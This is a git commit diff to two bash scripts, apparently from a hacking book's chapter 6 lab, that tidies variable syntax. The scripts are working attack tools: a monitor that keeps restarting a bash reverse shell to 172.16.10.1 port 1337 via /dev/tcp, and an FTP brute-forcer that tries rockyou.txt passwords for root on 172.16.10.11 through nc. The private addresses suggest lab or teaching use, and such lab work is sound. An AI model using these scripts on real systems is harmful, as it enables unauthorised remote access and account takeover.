caa0bd0fc4228cfcfe85f0734fb2d2df1b6dfaf2
nicholasaleks <nicholas.aleks@gmail.com>
2023-06-04 14:15:58 -0400

    Implement proper variable substitution

--- ch06/donation-monitor.sh
+++ ch06/donation-monitor.sh
@@ -1,13 +1,12 @@
 #!/bin/bash
 
 TARGET_HOST="172.16.10.1"
-TARGET_PORT=1337
-REVERSE_SHELL_COMMAND="bash -i >& /dev/tcp/$TARGET_HOST/$TARGET_PORT 0>&1"
+TARGET_PORT="1337"
 
 # Function to restart the reverse shell process
 restart_reverse_shell() {
   echo "Restarting reverse shell..."
-  eval "$REVERSE_SHELL_COMMAND &"
+  bash -i >& /dev/tcp/$TARGET_HOST/$TARGET_PORT 0>&1 &
 }
 
 # Continuously monitor the state of the reverse shell
--- ch06/ftp-bruteforce.sh
+++ ch06/ftp-bruteforce.sh
@@ -3,22 +3,22 @@
 IP="172.16.10.11" # IP Address of p-fpt-01
 PORT=21
 USERNAME="root"
-PASSWORDLIST="/usr/share/wordlists/rockyou1.txt"
+PASSWORDLIST="/usr/share/wordlists/rockyou.txt"
 
 # Loop through the wordlist and attempt password authentication
 while read -r PASSWORD; do
 
-  echo "Trying password: $PASSWORD"
+  echo "Trying password: ${PASSWORD}"
 
   # Attempt FTP login
-  res=$(echo -e "USER $USERNAME\r\nPASS $PASSWORD\r\nQUIT" | nc $IP $PORT)
+  res=$(echo -e "USER ${USERNAME}\r\nPASS ${PASSWORD}\r\nQUIT" | nc $IP $PORT)
 
   # Check the FTP server response for successful authentication
   if echo "$res" | grep -q "230"; then
-    echo "Password found: $PASSWORD"
+    echo "Password found: ${PASSWORD}"
     exit 0  # Exit the script if a valid password is found
   fi
-done < "$PASSWORDLIST"
+done < "${PASSWORDLIST}"
 
 # If the loop completes without finding a valid password
 echo "Password not found."
